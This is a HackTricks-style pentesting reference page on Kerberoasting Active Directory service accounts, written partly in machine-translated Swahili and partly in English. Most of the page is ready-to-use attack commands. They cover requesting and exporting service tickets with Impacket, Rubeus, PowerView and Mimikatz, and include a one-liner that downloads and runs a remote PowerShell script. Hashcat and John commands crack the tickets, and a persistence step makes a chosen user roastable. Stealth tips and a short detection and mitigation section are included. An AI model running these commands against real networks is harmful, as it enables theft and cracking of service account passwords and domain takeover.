# Kerberoast

{{#include ../../banners/hacktricks-training.md}}

## Kerberoast

Kerberoasting inazingatia upatikanaji wa **TGS tickets**, hasa zile zinazohusiana na huduma zinazofanya kazi chini ya **akaunti za mtumiaji** katika **Active Directory (AD)**, ikiondoa **akaunti za kompyuta**. Uthibitishaji wa tiketi hizi unatumia funguo zinazotokana na **nywila za watumiaji**, ikiruhusu uwezekano wa **kuvunja akidi za ofline**. Matumizi ya akaunti ya mtumiaji kama huduma yanaonyeshwa na mali ya **"ServicePrincipalName"** isiyo tupu.

Ili kutekeleza **Kerberoasting**, akaunti ya kikoa inayoweza kuomba **TGS tickets** ni muhimu; hata hivyo, mchakato huu hauhitaji **privileges maalum**, na hivyo inapatikana kwa mtu yeyote mwenye **akidi halali za kikoa**.

### Key Points:

- **Kerberoasting** inalenga **TGS tickets** za **huduma za akaunti za mtumiaji** ndani ya **AD**.
- Tiketi zilizothibitishwa kwa funguo kutoka **nywila za watumiaji** zinaweza **kuvunjwa ofline**.
- Huduma inatambulika kwa **ServicePrincipalName** ambayo si null.
- **Hakuna privileges maalum** zinazohitajika, ni lazima tu **akidi halali za kikoa**.

### **Attack**

> [!WARNING]
> **Zana za Kerberoasting** kwa kawaida huomba **`RC4 encryption`** wanapofanya shambulio na kuanzisha maombi ya TGS-REQ. Hii ni kwa sababu **RC4 ni** [**dhaifu**](https://www.stigviewer.com/stig/windows_10/2017-04-28/finding/V-63795) na rahisi kuvunjwa ofline kwa kutumia zana kama Hashcat kuliko algorithimu nyingine za uthibitishaji kama AES-128 na AES-256.\
> Hashi za RC4 (aina 23) huanza na **`$krb5tgs$23$*`** wakati AES-256 (aina 18) huanza na **`$krb5tgs$18$*`**.` 
> Zaidi, kuwa makini kwa sababu ombi la `Rubeus.exe kerberoast` linaomba tiketi kiotomatiki juu ya AKAUNTI ZOTE dhaifu ambazo zitakufanya ugundulike. Kwanza, pata watumiaji wanaoweza kerberoast na privileges za kuvutia kisha uendeshe tu juu yao.
```bash

#### **Linux**

```bash
# Metasploit framework
msf> use auxiliary/gather/get_user_spns
# Impacket
GetUserSPNs.py -request -dc-ip <DC_IP> <DOMAIN.FULL>/<USERNAME> -outputfile hashes.kerberoast # Neno la siri litaombwa
GetUserSPNs.py -request -dc-ip <DC_IP> -hashes <LMHASH>:<NTHASH> <DOMAIN>/<USERNAME> -outputfile hashes.kerberoast
# kerberoast: https://github.com/skelsec/kerberoast
kerberoast ldap spn 'ldap+ntlm-password://<DOMAIN.FULL>\<USERNAME>:<PASSWORD>@<DC_IP>' -o kerberoastable # 1. Tambua watumiaji wa kerberoastable
kerberoast spnroast 'kerberos+password://<DOMAIN.FULL>\<USERNAME>:<PASSWORD>@<DC_IP>' -t kerberoastable_spn_users.txt -o kerberoast.hashes # 2. Toa hashes
```

Multi-features tools including a dump of kerberoastable users:

```bash
# ADenum: https://github.com/SecuProject/ADenum
adenum -d <DOMAIN.FULL> -ip <DC_IP> -u <USERNAME> -p <PASSWORD> -c
```

#### Windows

- **Enumerate Kerberoastable users**

```bash
# Pata watumiaji wanaoweza kupewa Kerberoast
setspn.exe -Q */* #Hii ni binary iliyojengwa ndani. Lenga kwenye akaunti za watumiaji
Get-NetUser -SPN | select serviceprincipalname #Powerview
.\Rubeus.exe kerberoast /stats
```

- **Technique 1: Ask for TGS and dump it from memory**

```bash
#Pata TGS katika kumbukumbu kutoka kwa mtumiaji mmoja
Add-Type -AssemblyName System.IdentityModel
New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList "ServicePrincipalName" #Mfano: MSSQLSvc/mgmt.domain.local

#Pata TGSs kwa AKAUNTI ZOTE zinazoweza kerberoast (PCs zimejumuishwa, si busara sana)
setspn.exe -T DOMAIN_NAME.LOCAL -Q */* | Select-String '^CN' -Context 0,1 | % { New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList $_.Context.PostContext[0].Trim() }

#Orodhesha tiketi za kerberos katika kumbukumbu
klist

# Zitoa kutoka katika kumbukumbu
Invoke-Mimikatz -Command '"kerberos::list /export"' #Export tiketi kwenye folda ya sasa

# Geuza tiketi ya kirbi kuwa john
python2.7 kirbi2john.py sqldev.kirbi
# Geuza john kuwa hashcat
sed 's/\$krb5tgs\$\(.*\):\(.*\)/\$krb5tgs\$23\$\*\1\*\$\2/' crack_file > sqldev_tgs_hashcat
```

- **Technique 2: Automatic tools**

```bash
# Powerview: Pata hash ya Kerberoast ya mtumiaji
Request-SPNTicket -SPN "<SPN>" -Format Hashcat #Kutumia PowerView Ex: MSSQLSvc/mgmt.domain.local
# Powerview: Pata hashes zote za Kerberoast
Get-DomainUser * -SPN | Get-DomainSPNTicket -Format Hashcat | Export-Csv .\kerberoast.csv -NoTypeInformation

# Rubeus
.\Rubeus.exe kerberoast /outfile:hashes.kerberoast
.\Rubeus.exe kerberoast /user:svc_mssql /outfile:hashes.kerberoast #Mtumiaji maalum
.\Rubeus.exe kerberoast /ldapfilter:'admincount=1' /nowrap #Pata waadmin

# Invoke-Kerberoast
iex (new-object Net.WebClient).DownloadString("https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-Kerberoast.ps1")
Invoke-Kerberoast -OutputFormat hashcat | % { $_.Hash } | Out-File -Encoding ASCII hashes.kerberoast
```

> [!WARNING]
> When a TGS is requested, Windows event `4769 - A Kerberos service ticket was requested` is generated.

### Cracking

```bash
john --format=krb5tgs --wordlist=passwords_kerb.txt hashes.kerberoast  
hashcat -m 13100 --force -a 0 hashes.kerberoast passwords_kerb.txt  
./tgsrepcrack.py wordlist.txt 1-MSSQLSvc~sql01.medin.local~1433-MYDOMAIN.LOCAL.kirbi
```

### Persistence

If you have **enough permissions** over a user you can **make it kerberoastable**:

```bash
Set-DomainObject -Identity <username> -Set @{serviceprincipalname='just/whateverUn1Que'} -verbose
```

You can find useful **tools** for **kerberoast** attacks here: [https://github.com/nidem/kerberoast](https://github.com/nidem/kerberoast)

If you find this **error** from Linux: **`Kerberos SessionError: KRB_AP_ERR_SKEW(Clock skew too great)`** it because of your local time, you need to synchronise the host with the DC. There are a few options:

- `ntpdate <IP of DC>` - Deprecated as of Ubuntu 16.04
- `rdate -n <IP of DC>`

### Mitigation

Kerberoasting can be conducted with a high degree of stealthiness if it is exploitable. In order to detect this activity, attention should be paid to **Security Event ID 4769**, which indicates that a Kerberos ticket has been requested. However, due to the high frequency of this event, specific filters must be applied to isolate suspicious activities:

- The service name should not be **krbtgt**, as this is a normal request.
- Service names ending with **$** should be excluded to avoid including machine accounts used for services.
- Requests from machines should be filtered out by excluding account names formatted as **machine@domain**.
- Only successful ticket requests should be considered, identified by a failure code of **'0x0'**.
- **Most importantly**, the ticket encryption type should be **0x17**, which is often used in Kerberoasting attacks.

```bash
Get-WinEvent -FilterHashtable @{Logname='Security';ID=4769} -MaxEvents 1000 | ?{$_.Message.split("`n")[8] -ne 'krbtgt' -and $_.Message.split("`n")[8] -ne '*$' -and $_.Message.split("`n")[3] -notlike '*$@*' -and $_.Message.split("`n")[18] -like '*0x0*' -and $_.Message.split("`n")[17] -like "*0x17*"} | select ExpandProperty message
```

To mitigate the risk of Kerberoasting:

- Ensure that **Service Account Passwords are difficult to guess**, recommending a length of more than **25 characters**.
- Utilize **Managed Service Accounts**, which offer benefits like **automatic password changes** and **delegated Service Principal Name (SPN) Management**, enhancing security against such attacks.

By implementing these measures, organizations can significantly reduce the risk associated with Kerberoasting.

## Kerberoast w/o domain account

In **September 2022**, a new way to exploit a system was brought to light by a researcher named Charlie Clark, shared through his platform [exploit.ph](https://exploit.ph/). This method allows for the acquisition of **Service Tickets (ST)** via a **KRB_AS_REQ** request, which remarkably does not necessitate control over any Active Directory account. Essentially, if a principal is set up in such a way that it doesn't require pre-authentication—a scenario similar to what's known in the cybersecurity realm as an **AS-REP Roasting attack**—this characteristic can be leveraged to manipulate the request process. Specifically, by altering the **sname** attribute within the request's body, the system is deceived into issuing a **ST** rather than the standard encrypted Ticket Granting Ticket (TGT).

The technique is fully explained in this article: [Semperis blog post](https://www.semperis.com/blog/new-attack-paths-as-requested-sts/).

> [!WARNING]
> You must provide a list of users because we don't have a valid account to query the LDAP using this technique.

#### Linux

- [impacket/GetUserSPNs.py from PR #1413](https://github.com/fortra/impacket/pull/1413):

```bash
GetUserSPNs.py -no-preauth "NO_PREAUTH_USER" -usersfile "LIST_USERS" -dc-host "dc.domain.local" "domain.local"/
```

#### Windows

- [GhostPack/Rubeus from PR #139](https://github.com/GhostPack/Rubeus/pull/139):

```bash
Rubeus.exe kerberoast /outfile:kerberoastables.txt /domain:"domain.local" /dc:"dc.domain.local" /nopreauth:"NO_PREAUTH_USER" /spn:"TARGET_SERVICE"
```

## References

- [https://www.tarlogic.com/blog/how-to-attack-kerberos/](https://www.tarlogic.com/blog/how-to-attack-kerberos/)
- [https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/t1208-kerberoasting](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/t1208-kerberoasting)
- [https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/kerberoasting-requesting-rc4-encrypted-tgs-when-aes-is-enabled](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/kerberoasting-requesting-rc4-encrypted-tgs-when-aes-is-enabled)

{{#include ../../banners/hacktricks-training.md}}
